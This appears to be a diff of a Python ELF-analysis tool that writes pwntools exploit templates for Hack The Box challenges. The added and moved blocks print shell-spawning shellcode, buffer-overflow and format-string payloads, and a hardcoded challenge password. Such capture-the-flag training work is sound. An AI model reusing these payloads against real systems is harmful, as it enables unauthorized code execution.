@@ -2,7 +2,7 @@
 # coding:UTF-8
 
 # -------------------------------------------------------------------------------------
-#              PYTHON3 SCRIPT DATA[0]E FOR THE LOCAL ANALYSIS OF elf DATA[0]ES
+#              PYTHON3 SCRIPT FILE FOR THE LOCAL ANALYSIS OF ELF FILES
 #         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
 # -------------------------------------------------------------------------------------
 
@@ -1446,10 +1446,10 @@ while True:
                   DATA[3] = spacePadding("powerpc64", COL1)
                if "s390" in binary:
                   DATA[3] = spacePadding("s390", COL1)
-               if "sparc" in binary:
-                  DATA[3] = spacePadding("sparc", COL1)
-               if "sparc64" in binary:
-                  DATA[3] = spacePadding("sparc64", COL1)
+               if "arc32" in binary:
+                  DATA[3] = spacePadding("arc", COL1)
+               if "arc64" in binary:
+                  DATA[3] = spacePadding("arc64", COL1)
                if "thumb" in binary:
                   DATA[3] = spacePadding("thumb", COL1)
                if "vax" in binary:
@@ -2174,7 +2174,7 @@ while True:
             command("echo '#context.os = \"linux\"' >> " + localDir + "/exploit.py")
          else:
             command("echo '#context.os = \"windows\"' >> " + localDir + "/exploit.py")
-         command("echo '#context.arch = \"" + ARC.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
+         command("echo '#context.arch = \"" + DATA[3].rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
          command("echo '#context.bits = \"" + BIT[:2] + "\"' >> " + localDir + "/exploit.py")
          command("echo '#context.endian = \"" + IND.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py") # SPACER         
@@ -2253,15 +2253,47 @@ while True:
          command("echo '' >> " + localDir + "/exploit.py")         
         
 # HTB EXPLOITS
-         
-         if DATA[0][:3] == "reg":
-            command("echo 'payload = flat(padding,jumpto,terminater)' >> " + localDir + "/exploit.py")
-            command("echo '# print(payload)' >> " + localDir + "/exploit.py")         
-            command("echo '' >> " + localDir + "/exploit.py") # SPACER         
+              
          if DATA[0][:6] == "jeeves":
             command("echo 'payload = flat(padding,overwrite,terminater)' >> "  + localDir + "/exploit.py")
             command("echo '# print(payload)' >> " + localDir + "/exploit.py")
-            command("echo '' >> " + localDir + "/exploit.py") # SPACER         
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER       
+            
+         if DATA[0][:11] == "batcomputer":
+            command("echo 's.recvuntil(\">\")' >> " + localDir + "/exploit.py")
+            command("echo 's.sendline(\"1\")' >> " + localDir + "/exploit.py")
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER
+            command("echo 'leak_address = s.recvline().split()[-1]' >> " + localDir + "/exploit.py")
+            command("echo 'leak_address = int(leak_address,16)' >> " + localDir + "/exploit.py")
+            command("echo 'shellcode = asm(shellcraft.popad() + shellcraft.sh()) # Pop space  ' >> " + localDir + "/exploit.py")
+            command("echo 'padding = b\"a\" * (offset - len(shellcode))            # Adjust size' >> " + localDir + "/exploit.py")
+            command("echo 'payload = flat(shellcode,padding,leak_address)        # Payload    ' >> " + localDir + "/exploit.py")
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER
+            command("echo 's.recvuntil(\">\")' >> " + localDir + "/exploit.py")
+            command("echo 's.send(\"2\")' >> " + localDir + "/exploit.py")
+            command("echo 's.sendline(\"b4tp@$$w0rd!\")' >> " + localDir + "/exploit.py")
+            command("echo 's.recvline()' >> " + localDir + "/exploit.py")   
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER
+            
+         if DATA[0][:10] == "optimistic":
+            command("echo 's.sendlineafter(\":\", \"y\")' >> " + localDir + "/exploit.py")
+            command("echo 'rbp_addr = int(re.search(r\"(0x[\w\d]+)\", s.recvlineS()).group(0), 16)' >> " + localDir + "/exploit.py")
+            command("echo 'rbp_addr -= 96 # point at RSP instead of RBP' >> " + localDir + "/exploit.py")
+            command("echo 'shellcode = \"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V\"' >> " + localDir + "/exploit.py")
+            command("echo 'payload = flat([shellcode, cyclic(offset - len(shellcode)), rbp_addr])' >> " + localDir + "/exploit.py")
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER  
+            command("echo 's.sendlineafter(\"Email:\", \"420\")' >> " + localDir + "/exploit.py")
+            command("echo 's.sendlineafter(\"Age:\", \"1337\")' >> " + localDir + "/exploit.py")
+            command("echo 's.sendlineafter(\"Length of name:\", \"-1\")' >> " + localDir + "/exploit.py")
+            command("echo 's.sendlineafter(\"Name:\", payload)' >> " + localDir + "/exploit.py")
+            command("echo 's.interactive()'  >> " + localDir + "/exploit.py")
+            command("echo 'exit()'  >> " + localDir + "/exploit.py")                         
+            
+         if DATA[0][:3] == "reg":
+            command("echo 'payload = flat(padding,jumpto,terminater)' >> " + localDir + "/exploit.py")
+            command("echo '# print(payload)' >> " + localDir + "/exploit.py")         
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER                
+              
          if DATA[0][:11] == "htb-console":
             command("echo 'payload = flat(padding,pop_rdi,memory,system,terminater)' >> "  + localDir + "/exploit.py")
             command("echo '# print(payload)' >> " + localDir + "/exploit.py") 
@@ -2272,21 +2304,8 @@ while True:
             command("echo 's.sendline(\"/bin/sh\")' >> " + localDir + "/exploit.py")
             command("echo 's.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
             command("echo 's.sendline(\"flag\")' >> " + localDir + "/exploit.py")
-            command("echo 's.recvuntil(\":\")' >> " + localDir + "/exploit.py")                 
-         if DATA[0][:10] == "blacksmith":
-            command("echo 'shellcode  = asm(shellcraft.open(\"flag.txt\"))' >> "  + localDir + "/exploit.py")
-            command("echo 'shellcode += asm(shellcraft.read(3, \"rsp\", 0x100)) # read to rsp' >> "  + localDir + "/exploit.py")
-            command("echo 'shellcode += asm(shellcraft.write(1, \"rsp\", \"rax\"))  # write rsp  ' >> "  + localDir + "/exploit.py")
-            command("echo '' >> " + localDir + "/exploit.py") # SPACER            		
-            command("echo 's.sendlineafter(\">\", \"1\")' >> " + localDir + "/exploit.py")
-            command("echo 's.sendlineafter(\">\", \"2\")' >> " + localDir + "/exploit.py")           
-            command("echo 's.sendlineafter(\">\", flat(shellcode))' >> " + localDir + "/exploit.py")
-            command("echo '' >> " + localDir + "/exploit.py") # SPACER 
-            command("echo 's.recv()' >> " + localDir + "/exploit.py")
-            command("echo 'flag = s.recv()' >> " + localDir + "/exploit.py")
-            command("echo 'print(terminater, flag)' >> " + localDir + "/exploit.py")
-            command("echo 'exit(1)' >> " + localDir + "/exploit.py")
-            command("echo '' >> " + localDir + "/exploit.py") # SPACER                          
+            command("echo 's.recvuntil(\":\")' >> " + localDir + "/exploit.py")
+            
          if DATA[0][:9] == "leet_test":
             command("echo '#for i in range(100):' >> " + localDir + "/exploit.py")
             command("echo '#   try:' >> " + localDir + "/exploit.py")
@@ -2304,20 +2323,22 @@ while True:
             command("echo 'info(\"leaked_addr = 0x%x (%d)\", leaked_addr, leaked_addr)' >> " + localDir + "/exploit.py")
             command("echo 'random_num_addr = leaked_addr - 0x11f' >> " + localDir + "/exploit.py")
             command("echo 'payload = flat([\"%12$lln\", \"%13$llnaa\", pack(0x404078), pack(random_num_addr)])' >> " + localDir + "/exploit.py")
-            command("echo '' >> " + localDir + "/exploit.py") # SPACER              
-         if DATA[0][:10] == "optimistic":
-            command("echo 's.sendlineafter(\":\", \"y\")' >> " + localDir + "/exploit.py")
-            command("echo 'rbp_addr = int(re.search(r\"(0x[\w\d]+)\", s.recvlineS()).group(0), 16)' >> " + localDir + "/exploit.py")
-            command("echo 'rbp_addr -= 96 # point at RSP instead of RBP' >> " + localDir + "/exploit.py")
-            command("echo 'shellcode = \"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V\"' >> " + localDir + "/exploit.py")
-            command("echo 'payload = flat([shellcode, cyclic(offset - len(shellcode)), rbp_addr])' >> " + localDir + "/exploit.py")
-            command("echo '' >> " + localDir + "/exploit.py") # SPACER  
-            command("echo 's.sendlineafter(\"Email:\", \"420\")' >> " + localDir + "/exploit.py")
-            command("echo 's.sendlineafter(\"Age:\", \"1337\")' >> " + localDir + "/exploit.py")
-            command("echo 's.sendlineafter(\"Length of name:\", \"-1\")' >> " + localDir + "/exploit.py")
-            command("echo 's.sendlineafter(\"Name:\", payload)' >> " + localDir + "/exploit.py")
-            command("echo 's.interactive()'  >> " + localDir + "/exploit.py")
-            command("echo 'exit()'  >> " + localDir + "/exploit.py")
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER      
+                          
+         if DATA[0][:10] == "blacksmith":
+            command("echo 'shellcode  = asm(shellcraft.open(\"flag.txt\"))' >> "  + localDir + "/exploit.py")
+            command("echo 'shellcode += asm(shellcraft.read(3, \"rsp\", 0x100)) # read to rsp' >> "  + localDir + "/exploit.py")
+            command("echo 'shellcode += asm(shellcraft.write(1, \"rsp\", \"rax\"))  # write rsp  ' >> "  + localDir + "/exploit.py")
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER            		
+            command("echo 's.sendlineafter(\">\", \"1\")' >> " + localDir + "/exploit.py")
+            command("echo 's.sendlineafter(\">\", \"2\")' >> " + localDir + "/exploit.py")           
+            command("echo 's.sendlineafter(\">\", flat(shellcode))' >> " + localDir + "/exploit.py")
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER 
+            command("echo 's.recv()' >> " + localDir + "/exploit.py")
+            command("echo 'flag = s.recv()' >> " + localDir + "/exploit.py")
+            command("echo 'print(terminater, flag)' >> " + localDir + "/exploit.py")
+            command("echo 'exit(1)' >> " + localDir + "/exploit.py")
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER                          
             
 # ADD YOUR BESPOKE PAYLOADS HERE     
          command("echo 'try:' >> " + localDir + "/exploit.py")
